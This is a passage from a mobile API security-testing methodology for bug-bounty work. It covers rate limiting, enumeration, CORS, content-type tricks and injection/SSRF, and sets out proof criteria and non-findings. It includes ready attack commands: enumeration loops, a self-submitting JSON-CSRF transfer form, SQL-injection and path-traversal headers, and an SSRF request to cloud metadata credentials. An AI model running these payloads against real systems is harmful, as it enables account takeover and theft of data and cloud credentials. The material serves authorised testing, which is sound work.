  own** to see whether an attacker can lock a user out.
- **Proof:** 100+ consecutive 401s with no 429 and no lockout (NIST gives you the objective bar); or a
  200/401 — i.e. a *processed* request — immediately after a 429, differing only by one header value, shown
  side by side. For the cost story, the count of SMS actually delivered. Follow D15-030: sample 100+ before
  claiming absence, and name whether the limit is per-IP, per-account, per-session or per-device-header.
- **Escalation:** Absence of a limit on the **mobile** endpoint while the **web** endpoint is protected is the
  report's strongest sentence — show both. If `X-Forwarded-For` is honoured here, test whether it is also
  honoured for IP allow-lists, geofencing and fraud scoring (D15-040). Enumeration + no limit + a 4-digit OTP
  is a complete ATO chain: report it as **one chain**, not three findings (→ D13).
- **Ruled out when:** A 429 (or lockout, or a step-up challenge) appears within the sampled window, and every
  key-rotation variant continues to be throttled — **and** your egress was not allow-listed in a way that
  suppressed the control (D15-020). Rotating the app-generated `X-Device-Id`/`X-Install-Id` is the
  mobile-specific variant and is very common: test it explicitly before writing the negative.

### D15-087 · Account and data enumeration through response differentials, including the search oracle

| | |
|---|---|
| **Severity ceiling** | High when combined with an unthrottled login or OTP endpoint; Medium–Low alone |
| **VRT** | `broken_access_control.username_enumeration.non_brute_force` (P4); `server_security_misconfiguration.username_enumeration.brute_force` (P5) |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | API3:2023; API4:2023; MHL "Using WhatsApp for OSINT" (the pre-confirmation `POST /v2/exist` leaking `wa_old_device_name`, and its honest calibration — Meta did not classify it as a security issue) |

- **Test:** Four dimensions on login, registration, password-reset and "check availability": status code, body,
  field set, and timing. Then the mobile-specific version: "find friends", "search users", "invite contacts"
  and merchant/driver search are hit on every keystroke and are routinely exempt from the rate limiting applied
  to login — test whether they return more fields than the UI renders, accept exact-match lookups by
  email/phone, and enumerate at speed. Also hunt **pre-verification** endpoints: the request that fires before
  the user confirms is often unauthenticated, leaks, and — crucially — never notifies the victim.
- **How:**
  ```bash
  for u in me@example.com definitely-not-a-user-8f3a@example.com; do
    curl -s -o /tmp/o -w "%{http_code} %{size_download} %{time_total}\n" -X POST \
      https://api.example.com/v1/auth/check -H 'Content-Type: application/json' -d "{\"email\":\"$u\"}"
    jq -c 'keys' /tmp/o
  done
  curl -s "https://api.target/v1/users/search?q=a" -H "Authorization: Bearer $T" | jq '.[0]'
  curl -s -i "https://api.target/v1/users/lookup?phone=%2B919999999999" -H "Authorization: Bearer $T"
  seq 1 200 | xargs -P20 -I{} curl -s -o /dev/null -w '%{http_code}\n' \
    "https://api.target/v1/users/search?q={}" -H "Authorization: Bearer $T" | sort | uniq -c
  ```
  Drive the registration/recovery flow one screen at a time with interception on; at the confirmation dialog
  press **back/Edit** rather than **Yes**, and inspect what already went out.
- **Proof:** A stable, reproducible differential — different status, byte length, key set, or a timing gap far
  outside the measured variance at n ≥ 10 (D15-030); plus, for the search oracle, a single response containing
  fields the UI never shows and a 200-of-200 status distribution.
- **Escalation:** Whether enumeration is **cheap** decides the severity: the same leak is Low at
  one-per-manual-flow and High at bulk-enumerable. MHL's own counter-example is the useful calibration — an
  encrypted `ENC=` request body blocked mass enumeration and capped the severity; if you can extract the
  signing key (D12), re-test and re-rate. A confirmed phone→account oracle is the target list for OTP bombing
  and for the recycled-number path (→ D13).
- **Ruled out when:** All four dimensions are identical across existing and non-existing identifiers at n ≥ 10
  interleaved trials, the search endpoint returns only display-level fields, and it is throttled. Timing alone
  is never enough — the corpus's retraction was exactly that.

### D15-088 · CORS policy on the mobile API host

| | |
|---|---|
| **Severity ceiling** | High when combined with a cookie-based session; Low–Medium when the API is header-authenticated only |
| **VRT** | `server_security_misconfiguration.unsafe_cross_origin_resource_sharing` (parent node, no priority of its own — rate on the demonstrated data impact) |
| **Attacker** | AM-02 |
| **Applies to** | all HTTP APIs; mobile API hosts are often permissive because "only the app calls it" |
| **Maps to** | OWASP REST Security Cheat Sheet (disable CORS headers unless cross-domain calls are necessary; be specific about allowed origins) |

- **Test:** `Access-Control-Allow-Origin` reflecting the request origin (or `null`) together with
  `Access-Control-Allow-Credentials: true` turns every mobile-only endpoint into a cross-site data-theft
  target — including the ones you just proved have BOLA. Watch for unanchored subdomain regexes:
  `/^https?:\/\/.*\.target\.com$/` matches `https://evil.target.com.attacker.com`.
- **How:**
  ```bash
  for o in https://evil.example "null" "https://api.example.com.evil.example" "http://api.example.com" \
           "https://evil.api.example.com"; do
    printf '%-42s ' "$o"
    curl -s -D- -o /dev/null "https://api.example.com/v1/me" -H "Origin: $o" -H "Authorization: Bearer $TOKEN" \
      | grep -iE 'access-control-allow-(origin|credentials)' | tr '\n' ' '; echo
  done
  # and with a cookie session instead of the bearer, if one exists
  curl -sI https://api.example.com/v1/me -H "Origin: https://evil.example" -H "Cookie: session=$SESS" | grep -i access-control
  ```
  Automate the sweep with Corsy.
- **Proof:** `Access-Control-Allow-Origin` echoing an attacker-controlled origin alongside
  `Access-Control-Allow-Credentials: true`, **plus a working PoC page** on your origin that fetches with
  `credentials:'include'` and exfiltrates the body. A CORS wildcard without the credential-exfil PoC is on the
  never-submit list.
- **Escalation:** Be precise about the credential mechanism: if the API authenticates by `Authorization` header
  only, the attacker's page cannot supply it — say so, and then test whether a cookie session also exists.
  Chain shapes that raise it to Critical: a dangling CNAME on an allow-listed subdomain claimed by the
  attacker; stored XSS on an allow-listed `beta.` host reaching an "internal-only" route; and
  `Content-Type: text/plain` bodies parsed as JSON, which avoid the preflight entirely. A permissive policy on
  an endpoint you already proved has BOLA makes the BOLA exploitable from a web page — re-rate it.
- **Ruled out when:** The origin is not reflected (a static allow-list of first-party origins), `null` is
  refused, credentials are not allowed, and the allow-list regex is anchored — checked with the
  `evil.target.com.attacker.com` and `target.com.evil` forms, not just a bare foreign origin.

### D15-089 · Content-type manipulation against the mobile API

| | |
|---|---|
| **Severity ceiling** | High when it bypasses an authorisation or validation control; Low when it only changes the error format |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES) when it bypasses a control |
| **Attacker** | AM-02 / AM-05 |
| **Applies to** | all |
| **Maps to** | PortSwigger API testing ("changing the content type may enable you to trigger errors that disclose useful information" or bypass defences); OWASP REST Security Cheat Sheet (reject unexpected content types → 415) |

- **Test:** The same handler often behaves differently when the body is form-encoded rather than JSON —
  bypassing validation, CSRF checks or authorisation filters written for one shape only. The `text/plain`
  variant additionally makes a JSON-bodied state change forgeable from a web page with no preflight, which
  matters wherever the API accepts cookie auth (mobile APIs commonly relax the content-type check).
- **How:**
  ```bash
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$URL" -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/x-www-form-urlencoded' -d "amount=1&cartId=$C"
  for ct in 'text/plain' 'application/xml' 'multipart/form-data' 'application/json;charset=utf-7' ''; do
    printf '%-38s -> ' "${ct:-<absent>}"
    curl -s -o /dev/null -w '%{http_code}\n' -X POST "$URL" -H "Authorization: Bearer $TOKEN" \
      ${ct:+-H "Content-Type: $ct"} --data-binary '{"amount":1,"cartId":"'"$C"'"}'
  done
  ```
  The JSON-CSRF form, where cookie auth exists:
  ```html
  <form action="https://api.example.com/v1/transfer" method="POST" enctype="text/plain">
  <input name='{"to":"attacker","amount":100,"x":"' value='"}'>
  </form><script>document.forms[0].submit()</script>
  ```
- **Proof:** A behaviour delta: a validation error under JSON disappearing under form encoding, or the
  `text/plain` form executing the action against a victim session with no CSRF token.
- **Escalation:** → D10, because the app's own WebView may share the cookie jar with the API host, giving an
  in-app exploit path that needs no browser.
- **Ruled out when:** Unexpected content types return 415 with no processing, and the API requires a
  non-simple header (a bearer token or a custom header) that a cross-origin form cannot set.

### D15-090 · Hand the client-only parameter set to the injection and SSRF batteries

| | |
|---|---|
| **Severity ceiling** | Critical (SQLi/command injection/SSRF to cloud metadata) |
| **VRT** | `server_side_injection.sql_injection` (P1), `server_side_injection.remote_code_execution_rce` (P1), `server_side_injection.server_side_request_forgery_ssrf` |
| **Attacker** | AM-05 |
| **Applies to** | all apps with a remote backend |
| **Maps to** | API7:2023 Server Side Request Forgery; API8:2023; Mobile Top 10 2024 M4; MASWE-0050 (CWE-20, CWE-89, CWE-116); MASVS-CODE-4; ATT&CK T1428, T1426 |

- **Test:** This chapter's job is not to re-run a web injection catalogue; it is to hand the injection and SSRF
  work the parameters **only the mobile client produces**, which are therefore rarely fuzzed: device id, push
  token, locale, app version, telemetry blobs, `@QueryMap` free keys (D15-003), and every URL-bearing field the
  client can set (avatar-from-URL, link preview, document import, webhook registration). Do this **after**
  D15-025 to D15-028, so you know whether an oracle exists at all.
- **How:**
  ```bash
  grep -rniE 'addHeader\(|header\(|setRequestProperty\(' $S | head -40
  grep -rniE '"(url|uri|callback|webhook|redirect|image_url|avatar_url|photo_url|next|return_to|target)"' $S | head -40
  # client-only headers, with a time oracle and a per-sink tagged collaborator host
  curl -s https://api.example.com/v1/telemetry -H "Authorization: Bearer $TOKEN" \
    -H "X-Device-Model: ' OR SLEEP(5)-- -" -H "Accept-Language: ../../etc/passwd" -d '{}' -w ' %{time_total}\n'
  # URL-bearing fields, one sub-tagged collaborator subdomain per sink
  curl -s -i -X PATCH https://api.example.com/v1/me -H "Authorization: Bearer $TOKEN" \
    -d '{"avatar_url":"http://avatar.<collab>/"}'
  curl -s -i -X POST https://api.example.com/v1/preview -H "Authorization: Bearer $TOKEN" \
    -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
  ```
- **Proof:** A deterministic oracle — a 5 s delay reproduced 3/3 against a sub-300 ms baseline, or `49`
  returned for `{{7*7}}` — or, for SSRF, **an out-of-band interaction from the target's egress IP**.
  **OOB-or-it-didn't-happen:** a URL echoed in a 500, a stack trace naming your URL (thrown by a *parser*, not
  a network library), a client-side fetch (browser UA, victim IP), and timing differences are all non-findings
  without the callback. "SSRF DNS callback only" is itself on the never-submit list — carry it to metadata or
  an internal service. Verbose errors (stack traces, SQL fragments, internal hostnames) are Low alone; report
  them through what they enable.
- **Escalation:** Metadata credentials → D18 cloud account. A stored URL in a profile field that a cron or
  avatar job fetches later is the second-order variant that defeats scanners. A stored payload delivered back
  into the app's WebView is client-side XSS with bridge access → D10.
- **Ruled out when:** D15-026's error-oracle table shows byte-identical responses for every non-payload variant
  at the parameter (injection structurally ruled out), *and* every URL-bearing parameter produces no
  collaborator interaction across 20+ tagged payloads with a working positive control. Record the payload count
  and the tag scheme; "we tried some payloads" is not a negative.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| GraphQL introspection enabled | `sensitive_data_exposure.graphql_introspection_enabled` is **P5**, and "introspection alone" is on the never-submit list | A specific undocumented mutation reached from a low-privilege session, or a field-level authz failure found via the schema (D15-072) |
| `{"data":{"__schema":null}}` reported as "introspection enabled" | `null` means **disabled** — not "worked but empty" | Nothing; re-test with suggestions and the APK operation documents instead |
| A 200 OK returned for another user's id | "200 OK without actually leaked data" is the single biggest N/A driver on H1/Bugcrowd; the body may be empty, may be your own session-scoped data, may be a cached impersonation response, or may be fields already public on the profile page | The second account's 8+ char marker present in the response and absent from the baseline (D15-029) |
| A 403→200 flip whose body is byte-identical | The edge normalised your input; the Body-Diff Rule says a byte-identical 200 is not a bypass | A body differential, with the changed bytes identified |
| `400 "field X is required"` from an unauthenticated request | A body parser or sanitiser may sit in front of the auth middleware — the layer-ordering trap | The same route still returning the field error for a minimal well-formed `{}` body (D15-024) |
| "The API version v1 still exists" | A version difference alone is **Informational** | A demonstrated regression on the old path: weaker auth, missing 429, weaker validation, or extra fields (D15-013) |
| A negative price accepted in the cart | Many cart APIs accept arbitrary client state while payment capture rejects it — the cart display is fiction | The credit settling as wallet balance, store credit or a refund to your payment instrument (D15-076) |
| A discount shown as `-$50.00` in the cart | Systems commonly cap the applied discount at 100%: captured payment `$0.00`, no refund issued | The captured payment or the issued refund reflecting the stacked discount (D15-078) |
| 100 aliased mutations all returning `success:true` | Apollo/GraphQL-Ruby/Graphene resolve aliases **sequentially**; this is quota enforcement, not a race | Server state showing N applied benefits, or a true parallel single-packet race (D15-085) |
| A single slow response for a valid username | Network jitter routinely produces 2× outliers | n ≥ 10 interleaved trials with the suspect mean ≥ 2σ above control (D15-030) |
| An md5 differential across identical requests | Unordered collections serialise differently: same set, same length, different hash | The differential surviving normalisation (sorted arrays, volatile keys stripped) (D15-025) |
| A uniform 401 on every endpoint from curl | Usually a stale `__cf_bm`-class bot cookie or a duplicated cookie row, not a revoked session | The same request failing when issued by the app itself (D15-028) |
| A zero-byte 4xx body (md5 `d41d8cd9…`) | Edge/protocol rejection — HTTP header values are ISO-8859-1, so unicode payloads die at the proxy | An origin response with a body |
| A "file existence oracle" on a blocked extension | A fixed deny-list is a server policy, not a state oracle | The differentiator tracking a value that cannot exist in the dataset (D15-031) |
| Client-sent `finalCustomerAmount` / `senderId` in the request body | A client-sent security value is an **enabling condition**; the server may recompute from the cart session | The server honouring the tampered value in the persisted object, read back with a separate GET (D15-004, D15-076) |
| OAuth `client_secret` found in the APK | Known and expected for a public client — on the never-submit list | PKCE non-enforcement at the token endpoint, which is the reportable finding (→ D13) |
| SSRF confirmed by a DNS callback only | "SSRF DNS callback only" is on the never-submit list | Cloud metadata or an internal admin API reached, with content returned or exfiltrated OOB (D15-081) |
| No certificate pinning on the API host | `mobile_security_misconfiguration.ssl_certificate_pinning.absent` is **P5**; once you decrypt, pinning is irrelevant to severity | Nothing on its own — it is the harness, not the finding (→ D14) |
| "No application-layer payload encryption" | A MAS-R resilience control (MASWE-0062); Informational on most programs | Whatever you achieve once inside it — a tampered amount or object id accepted (D15-084) |
| A mobile-only endpoint that exists | Enumeration is Support, not a finding | The missing authorisation, missing throttle or extra fields demonstrated on it (D15-012) |
| A UUID-keyed IDOR with no leak path | Defaults to P4 and `AC:H`; some programs exclude UUID-dependent access control outright | An in-app, repeatable method to obtain the specific ids — another API response, a share link, a push payload, a provider row (D15-039) |
| Admin-only data returned to every client but hidden in the UI | Rated as privilege escalation, and often only Medium | Showing the value is used as a credential, or that it unlocks an action the role cannot perform (D15-046) |

## Cross-surface joins

- **D10/D11/D07/D20 (any token-leak primitive) × D15-021 — the cross-boundary join.** A bridge that returns
  the session header, a world-readable `shared_prefs` blob, a provider row or a logcat line is **Informational
  until you replay it**. The join nobody runs is the two-minute curl check: move the token to a host that never
  ran the app and strip the device header. A leaked token that works from anywhere is
  `broken_authentication_and_session_management.authentication_bypass` (P1); the same leak with a genuinely
  sender-constrained token is a P5 storage note. File the storage primitive first, then the server-side
  consumer, then link them.
- **D07 provider rows / D09 deep-link parameters / D24 push payloads × D15-039 — the AC:H join.** The
  HackerOne standard sets `AC:H` on a UUID-keyed IDOR by default and drops it to `AC:L` when you demonstrate a
  reliable way to obtain the ids. Nobody reviews the exported-provider table and the API's object-id space
  together — but an exported provider that hands out server object ids is exactly that demonstration, and it
  moves the same bug two VRT bands.
- **D01 binary inventory × the live web API — the shadow-API join.** The app's hardcoded endpoints are
  frequently an older API version than the web app uses. Diff the *behaviour* (auth strength, 429, validation,
  field exposure) rather than the response shape, for the same operation. The version difference is
  Informational; the weakened control is the finding, and it is the single highest-value structural move
  available on a mobile engagement.
- **D21 attestation × every "requires a modified client" caveat.** Vendors downgrade findings by asserting that
  root detection or Play Integrity prevents exploitation. D15-084 answers that in one request: if the server
  accepts the call with the verdict stripped or replayed, every such caveat evaporates and each affected
  finding must be re-rated upward. Test the attestation *before* you accept a downgrade, not after.
- **D12 hardcoded keys × D15-076/D15-081 — the signed-request join.** An HMAC key recovered from the binary
  turns "the request is signed, so it cannot be tampered" into a price-tampering and webhook-forgery primitive.
  The crypto team reviews the key; the API team reviews the endpoint; nobody joins them.
- **D18 storage buckets / CDN × D15-047 and D15-088.** A pre-signed media URL, a subdomain takeover on an
  allow-listed CORS origin, and an unauthenticated CDN path for private documents are three surfaces owned by
  three different teams. Together they are unauthenticated bulk retrieval of KYC documents from a page the
  attacker controls.
- **D11 offline queue × D15-080.** Offline-first apps persist pending mutations locally and replay them on
  reconnect. Editing the queued transition on disk delivers an out-of-order or forged state change through a
  path the UI never shows and the server treats as first-party — the state-machine bug with a local delivery
  vehicle.
- **D10 WebView × D15-046/D15-064 — the stored-payload join.** A profile field the API lets you write
  (sometimes keyed only on a non-secret identifier) rendered by a first-party WebView that carries a bridge is
  the cleanest full chain in mobile: weak API authorisation → stored XSS on a trusted origin → bridge → token →
  ATO. Test every free-text field the API accepts against every screen that renders server-supplied HTML.
- **D13 OTP/session × D15-086/D15-087 — the chain that must be filed as one.** Enumeration gives the target
  list, the missing mobile-side rate limit gives the attempts, and a 4–6 digit OTP gives the takeover. Filed
  separately they are P4, P4 and "expected"; filed as one chain with the arithmetic, it is an authentication
  bypass.
- **D23 payments × D15-085.** The payments team tests the happy path and the fraud engine; nobody fires 30
  single-packet requests at the top-up, referral-credit or scratch-card endpoints that exist only in the mobile
  client. Those are the "you may do this once" controls with no lock.

## Sources

- **Mandatory read — `secondary/claude-bughunter.md`** (mined from a 4,467-star bug-hunting corpus): the
  layer-ordering trap; marker discipline, the Body-Diff Rule, the Statistical-Sample Rule,
  Server-Policy-vs-State and the Shell-Loop Ban; the shadow-API behavioural-diff method and its severity table;
  the mobile auth specifics (client-only rate limits, PKCE non-enforcement as the reportable finding rather
  than the `client_secret`); the five-screenshot evidence pattern and PII-masking split; the pre-severity gate
  run against the Critical claim, retraction-appendix discipline and the do-not-retract-on-mid-engagement-patch
  rule; chain-filing order; the GraphQL pattern library (Relay `node()`, field-level authz, alias batching and
  its race correction, APQ fallback, operation-type confusion, mutation-over-GET); business-logic patterns
  (negative price, currency swap, step-skip, cart TOCTOU, webhook replay, coupon/referral, bulk-action gap,
  soft-delete persistence); OData `$filter`/`$orderby`/`$expand`; server-side prototype pollution and SSPP.
- **`frontier/api-and-server-side.md`**: the Retrofit/R8 annotation-survival method and the endpoint,
  parameter, `@Url`, interceptor and OkHttp-tap recovery chain; gRPC/grpcurl and blackbox protobuf; the
  version-ladder and app-version-header downgrade; the two-account BOLA sweep with negative control; the
  single-account checks; mass assignment from DTOs and at registration; BFLA; price/quantity/currency/coupon/
  referral/workflow items; the single-packet race and Turbo Intruder gate; rate limiting (NIST SP 800-63B
  §5.2.2) and its bypasses; the non-determinism, error-oracle and validation-signature discipline; Autorize;
  bulk/sync endpoints; pre-signed URLs; CORS; content-type and method manipulation; idempotency and replay; and
  the cross-boundary curl check with RFC 9449 DPoP.
- **`local/skill-corpus-method.md` and `local/skill-corpus-classes.md`** (senior-researcher corpus): the
  endpoint-table shape and the `1.0/payment-aggregator/users/bank-details/{userId}` flagship candidate; the
  `OrderRequestBody` worked example; "client-sent security values are enabling conditions, not bugs"; the
  two-tester-owned-accounts boundary and the no-scanners rule of engagement; the four layer-attribution
  misreads (zero-byte body, stale `__cf_bm`, duplicate cookie rows, 429 contamination); the API-authz
  SUSPECTED/NEEDS-VERIFICATION reporting discipline; and the "cross the trust boundary" escalation axis.
- **OWASP** (`primary/owasp-mastg.md`, `primary/owasp-mobile-top10.md`): the MASTG coverage gap for
  server-side authorisation, stated explicitly; MASTG-TEST-0392/-0382 enforced updating, MASTG-TEST-0338
  storage-integrity, MASWE-0062 payload encryption, MASWE-0018, MASTG-TECH-0022/-0011/-0012/-0010/-0043;
  API1–API10:2023 with their documented scenarios (the VIN BOLA, `total_stay_price`, `blocked:false`,
  `deleteReports`, `reportUser`, the referral-credit API6 scenario, the beta-environment API9 scenario);
  Mobile Top 10 2024 M3/M4/M8; WSTG-BUSL-01 … -06.
- **Bugcrowd VRT 2026-07-08 and program economics** (`primary/bugcrowd-vrt-severity.md`,
  `primary/vrp-program-economics.md`): the P1/P2/P3/P4/P5 IDOR fork on view-vs-modify and iterable-vs-GUID
  (CWE-932); `broken_access_control.privilege_escalation` as VARIES; `server_security_misconfiguration.race_condition`;
  the no-rate-limiting and username-enumeration nodes; `exposed_portal.admin_portal`; the HackerOne Platform
  Standards AC:H/AC:L rule for unpredictable ids (effective 2 April 2024, updated 20 January 2026) and the
  "stop as soon as PII is exposed" instruction; Spotify's UUID exclusion; Airbnb's named mobile-API scope;
  Google's exclusion of backend services from its Android programs.
- **Disclosed reports** (`realworld/h1-disclosed-mobile.md`, `realworld/bugcrowd-intigriti-writeups.md`,
  `secondary/writeups-realfinds.md`, `secondary/sehno-gowthams.md`): H1 #186279, #754044, #203042, #757095,
  #753280, #221558, #1080901, #447975, #479139, #1819832, #1213237, #743953, #3124517, #394329, #415081,
  #2032716, #981472, #1066203, #1618347, #807448, #489146, #2207248, #3287208, #1849626, #759247, #429026,
  #300305, #2110030, #1438052, #1520931, #2078571, #119657, #307239, #1295844, #1543159, #894569, #486629; the
  Cobalt undisclosed-endpoint case study; the SirBugs unauthenticated CRM `hard_id` write that opened a
  four-bug ATO chain; the Voorivex unauthenticated internal SMS service.
- **`gaps-gap-coverage.md` and `gaps-gap-adversary.md`**: the surfaces no checklist carries — the search/
  autocomplete PII oracle, client-timestamp sync conflict resolution, the GDPR export job and artefact, support
  ticket/message/attachment ids tested separately, KYC document IDOR and re-upload overwrite, client-asserted
  KYC status, notification-preference cross-user writes, push/device registration BOLA and FCM topic
  namespaces.
- **`frontier/modern-api-surfaces.md`, `frontier/undertested-surfaces.md`, `realworld/crossplatform-frameworks.md`,
  `architecture/aosp-core.md`, `secondary/frida-drozer-tooling.md`, `secondary/hrishikesh-hacktricks.md`,
  `secondary/indusface-singh-riya.md`, `secondary/sallam-hetmehta.md`, `primary/mitre-attack-mobile.md`,
  `primary/exploitdb-cve-patterns.md`, `primary/mobilehackinglab.md`**: Play Integrity's four server-side
  baseline checks, `requestHash` content binding and the SafetyNet January-2025 turndown; companion-surface and
  retired-Instant-App endpoints; cross-platform bundle endpoint extraction; device identifiers used as
  authorisation; the Frida request-tampering and heap-evaluate technique; the "run the full web checklist once
  traffic is visible" framing; the `@SerializedName` mass-assignment oracle; ATT&CK T1428/T1641/T1633.001/
  T1630.003/T1636.004 and M1002; CVE-2015-7889 (EDB 38558) sequential message ids; and the MHL pre-confirmation
  leak with its enumeration-cost severity calibration.
